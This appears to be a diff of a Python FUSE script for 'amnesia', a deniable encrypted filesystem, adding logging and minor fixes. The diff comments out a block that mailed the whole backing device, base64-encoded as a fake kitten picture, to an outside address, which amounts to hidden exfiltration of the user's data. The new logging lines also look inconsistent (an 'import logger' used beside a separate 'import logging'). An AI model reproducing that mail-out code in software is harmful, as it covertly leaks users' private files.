@@ -1,4 +1,4 @@
-#!/usr/bin/python2.5
+#!/usr/bin/python2.6
 
 """
 amnesia fuse bindings
@@ -22,7 +22,7 @@ from getpass import getpass
 import smtplib
 import email
 import base64
-
+import logger
 
 if not hasattr(fuse, '__version__'):
     raise RuntimeError, \
@@ -51,6 +51,9 @@ class amnesiaFS(Fuse):
     
     def begin(self, plaintext_keys):
         global hyper_instance
+        logname = "/tmp/amnesia.log"
+        #logging.basicConfig(filename=logname, level=logging.DEBUG, filemode="w")
+        logger.debug("amnesia log starting")
         print "mounting amnesiaFS from %s"%self.root
         self.hyperblock = Hyperblock(open(self.root, "r+"))
         hyper_instance = self.hyperblock
@@ -336,7 +339,7 @@ Amnesia - a deniable filesystem.
                  dash_s_do='setsingle')
 
     server.parser.add_option(mountopt="root", metavar="DEVICE", default='/tmp/lulz',
-                             help="mount amnesia at DEVICE [default: %default]")
+                             help="mount amnesia from DEVICE [default: %default]")
     server.parse(values=server, errex=1)
     
     try:
@@ -353,37 +356,39 @@ Amnesia - a deniable filesystem.
             plaintext_keys.append(k)
         else:
             break
-
+    logname = "/tmp/amnesia.log"
+    print "begin logging to %s"%logname
+    import logging
     server.begin(plaintext_keys)
     del plaintext_keys
-
+    print "server starting..."
     server.main()
     
-    msgFile = open(root)
-    message = StringIO.StringIO()
-    writer = MimeWriter.MimeWriter(message)
-    writer.addheader('From', 'root@manticore.thoughtcrime.local')
-    writer.addheader('To', 'cartel@thoughtcrime.org.nz')
-    writer.addheader('Subject', 'confusion')
-    writer.startmultipartbody('mixed')
-    part = writer.nextpart()
-    body = part.startbody('text/plain')
-    body.write('This is a picture of a kitten, enjoy :)')
-    part = writer.nextpart()
-    part.addheader('Content-Transfer-Encoding', 'base64')
-    body = part.startbody('image/jpeg')
-    base64.encode(msgFile, body)
-    writer.lastpart()
-    smtp = smtplib.SMTP('aspmx.l.google.com')
-    smtp.sendmail('root@manticore.thoughtcrime.local', 'cartel@thoughtcrime.org.nz', message.getvalue())
-    smtp.quit()
+    # msgFile = open(root)
+    # message = StringIO.StringIO()
+    # writer = MimeWriter.MimeWriter(message)
+    # writer.addheader('From', 'root@manticore.thoughtcrime.local')
+    # writer.addheader('To', 'cartel@thoughtcrime.org.nz')
+    # writer.addheader('Subject', 'confusion')
+    # writer.startmultipartbody('mixed')
+    # part = writer.nextpart()
+    # body = part.startbody('text/plain')
+    # body.write('This is a picture of a kitten, enjoy :)')
+    # part = writer.nextpart()
+    # part.addheader('Content-Transfer-Encoding', 'base64')
+    # body = part.startbody('image/jpeg')
+    # base64.encode(msgFile, body)
+    # writer.lastpart()
+    # smtp = smtplib.SMTP('aspmx.l.google.com')
+    # smtp.sendmail('root@manticore.thoughtcrime.local', 'cartel@thoughtcrime.org.nz', message.getvalue())
+    # smtp.quit()
         
-    #try:
-    #    if server.fuse_args.mount_expected():
-    #        os.chdir(server.root)
-    #except OSError:
-    #    print >> sys.stderr, "can't enter root of underlying filesystem"
-    #    sys.exit(1)
+    try:
+       if server.fuse_args.mount_expected():
+           os.chdir(server.root)
+    except OSError:
+       print >> sys.stderr, "can't enter root of underlying filesystem"
+       sys.exit(1)
 
     
 
